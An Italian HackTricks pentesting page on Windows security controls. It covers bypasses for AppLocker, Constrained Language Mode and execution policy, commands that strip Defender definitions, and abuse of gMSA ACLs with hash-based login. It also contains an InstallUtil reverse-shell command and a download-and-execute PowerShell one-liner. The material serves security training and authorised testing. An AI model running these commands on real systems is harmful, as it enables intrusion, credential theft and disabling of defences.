# Controlli di sicurezza di Windows

{{#include ../../banners/hacktricks-training.md}}

## Policy AppLocker

Una whitelist delle applicazioni è un elenco di applicazioni software o eseguibili approvati che possono essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvati che non sono in linea con le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di whitelisting delle applicazioni** di Microsoft e offre agli amministratori di sistema il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce un **controllo granulare** su eseguibili, script, file Windows Installer, DLL, app pacchettizzate e installer di app pacchettizzate.\
È comune che le organizzazioni **blocchino cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere bypassato**.

### Verifica

Verifica quali file/estensioni sono nella blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Questo percorso del registro contiene le configurazioni e le policy applicate da AppLocker e consente di esaminare l’insieme attuale di regole applicate sul sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** utili per effettuare il bypass della policy di AppLocker: se AppLocker consente di eseguire qualsiasi elemento all’interno di `C:\Windows\System32` o `C:\Windows`, sono disponibili **writable folders** che puoi usare per **effettuare il bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I binari [**"LOLBAS's"**](https://lolbas-project.github.io/) comunemente **considerati affidabili** possono essere utili anche per bypassare AppLocker.
- Le regole **scritte male possono anch'esse essere bypassate**
- Ad esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e questa sarà consentita.
- Le organizzazioni spesso si concentrano anche sul **blocco dell'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano le **altre posizioni degli eseguibili di** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- L'applicazione delle regole alle **DLL** è molto raramente abilitata a causa del carico aggiuntivo che può comportare per il sistema e della quantità di test necessari per assicurarsi che nulla si rompa. Pertanto, usare le **DLL come backdoor** aiuterà a bypassare AppLocker.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per ulteriori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Archiviazione delle credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file; le password sono sottoposte a hashing.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (sottoposte a hashing) vengono **salvate** nella **memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **security policy** locale (policy delle password, autorizzazioni degli utenti...), **autenticazione**, **token di accesso**...\
LSA sarà il componente che **verificherà** le credenziali fornite all'interno del file **SAM** (per un accesso locale) e **comunicherà** con il **domain controller** per autenticare un utente del dominio.

Le **credenziali** vengono **salvate** all'interno del **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittografabili.

### Segreti LSA

LSA può salvare su disco alcune credenziali:

- Password dell'account computer di Active Directory (domain controller irraggiungibile).
- Password degli account dei servizi Windows
- Password per i task pianificati
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database di Active Directory. È presente solo nei Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11 e nelle versioni di Windows Server. **Blocca** strumenti comuni di pentesting come **`WinPEAS`**. Tuttavia, esistono modi per **bypassare queste protezioni**.

### Verifica

Per verificare lo **stato** di **Defender**, puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo, puoi anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e memorizzata nell'**alternative data stream** $EFS del file crittografato. Quando è necessaria la decrittografia, la **chiave privata** corrispondente al certificato digitale dell'utente viene utilizzata per decrittografare la FEK dallo stream $EFS. Ulteriori dettagli sono disponibili [qui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Gli scenari di decrittografia senza l'intervento dell'utente** includono:

- Quando i file o le cartelle vengono spostati su un file system non EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono decrittografati automaticamente.
- I file crittografati inviati sulla rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente **l'accesso trasparente** ai file crittografati da parte del proprietario. Tuttavia, cambiare semplicemente la password del proprietario ed effettuare il login non consentirà la decrittografia.

**Punti chiave**:

- EFS utilizza una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- La decrittografia utilizza la chiave privata dell'utente per accedere alla FEK.
- La decrittografia automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione di rete.
- I file crittografati sono accessibili al proprietario senza ulteriori passaggi.

### Controllare le informazioni EFS

Verificare se un **utente** ha **utilizzato** questo **servizio**, controllando se esiste questo percorso:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Controllare **chi** ha **accesso** al file usando cipher /c \<file>\
È inoltre possibile usare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittografare i file EFS

#### Essere Authority System

Questo metodo richiede che l'**utente vittima** stia **eseguendo** un **processo** all'interno dell'host. In tal caso, utilizzando una sessione `meterpreter` è possibile impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). In alternativa, è possibile eseguire semplicemente `migrate` sul processo dell'utente.

#### Conoscere la password dell'utente

Mimikatz documenta come importare il certificato dell'utente e il materiale della chiave privata e decrittografare i file protetti da EFS quando si conosce la password.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato i **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali, che spesso hanno l'impostazione "**Password never expire**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: i gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base ai criteri del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali della password.
- **Sicurezza migliorata**: questi account sono immuni dai blocchi e non possono essere utilizzati per i login interattivi, migliorando la sicurezza.
- **Supporto per più host**: i gMSA possono essere condivisi tra più host, risultando ideali per i servizi eseguiti su più server.
- **Supporto per le attività pianificate**: a differenza dei managed service accounts, i gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando cambiano i dettagli sAMaccount o il nome DNS del computer, semplificando la gestione degli SPN.

Le password dei gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono reimpostate automaticamente ogni 30 giorni dai Domain Controller (DC). Questa password, un blob di dati crittografato noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server sui quali sono installati i gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni è necessaria una connessione protetta come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

È possibile leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trova maggiori informazioni nella ricerca originale archiviata**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

La stessa ricerca spiega come un **NTLM relay attack** possa ottenere una **password gMSA** quando il principal sottoposto a relay è autorizzato a leggere `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abusare del concatenamento degli ACL per leggere la password gestita gMSA (GenericAll -> ReadGMSAPassword)

In molti ambienti, gli utenti con privilegi ridotti possono ottenere l'accesso ai segreti gMSA senza compromettere il DC abusando di ACL degli oggetti configurati in modo errato:<sup>[[3]](#references)</sup>

- A un gruppo che puoi controllare (ad esempio tramite GenericAll/GenericWrite) viene concesso `ReadGMSAPassword` su una gMSA.
- Aggiungendoti a quel gruppo, erediti il diritto di leggere il blob `msDS-ManagedPassword` della gMSA tramite LDAP e ricavare credenziali NTLM utilizzabili.

Workflow tipico:

1) Individua il percorso con BloodHound e contrassegna i tuoi principal di foothold come Owned. Cerca edge come:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Aggiungiti al gruppo intermedio che controlli (esempio con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leggere la password gestita di gMSA tramite LDAP e ricavare l'hash NTLM. NetExec automatizza l'estrazione di `msDS-ManagedPassword` e la conversione in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autenticati come gMSA usando l'hash NTLM (non è necessario il testo in chiaro). Se l'account è nel gruppo Remote Management Users, WinRM funzionerà direttamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Note:
- Le letture LDAP di `msDS-ManagedPassword` richiedono il sealing (ad esempio LDAPS/sign+seal). Gli strumenti gestiscono automaticamente questo requisito.
- Ai gMSA vengono spesso assegnati diritti locali come WinRM; convalida l'appartenenza ai gruppi (ad esempio Remote Management Users) per pianificare il movimento laterale.
- Se ti serve solo il blob per calcolare autonomamente l'NTLM, consulta la struttura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente di gestire le password dell'Administrator locale. Queste password, **randomizzate**, uniche e **modificate regolarmente**, vengono archiviate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACL agli utenti autorizzati. Con permessi sufficienti, è possibile leggere le password dell'amministratore locale.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blocca molte delle funzionalità** necessarie per utilizzare PowerShell in modo efficace, ad esempio bloccando gli oggetti COM, consentendo solo i tipi .NET approvati, i workflow basati su XAML, le classi PowerShell e altro ancora.

### **Verifica**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Nelle versioni recenti di Windows, quel bypass non funziona più, ma puoi usare [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potrebbe essere necessario** **aggiungere un riferimento** -> _Browse_ ->_Browse_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **modificare il progetto in .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per ulteriori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Criteri di esecuzione di PS

Per impostazione predefinita è impostato su **restricted.** Modi principali per bypassare questo criterio:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Ulteriori informazioni sono disponibili [qui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Interfaccia dei Security Support Provider (SSPI)

È l'API che può essere utilizzata per autenticare gli utenti.

SSPI seleziona un protocollo di autenticazione appropriato per due macchine comunicanti, preferendo Kerberos quando disponibile. Questi protocolli sono implementati dai Security Support Provider (SSP), installati come DLL su Windows; entrambi i peer devono supportare il provider negoziato.

### SSP principali

- **Kerberos**: Quello preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Per motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Server web e LDAP, password sotto forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Viene utilizzato per negoziare il protocollo da usare (Kerberos o NTLM, con Kerberos come predefinito)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi oppure uno solo.

## UAC - Controllo dell'account utente

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relay per gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA tramite concatenamento dei diritti a WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Elusione di AppLocker e della modalità linguaggio vincolato di PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 modi per aggirare la PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrittografare i file EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
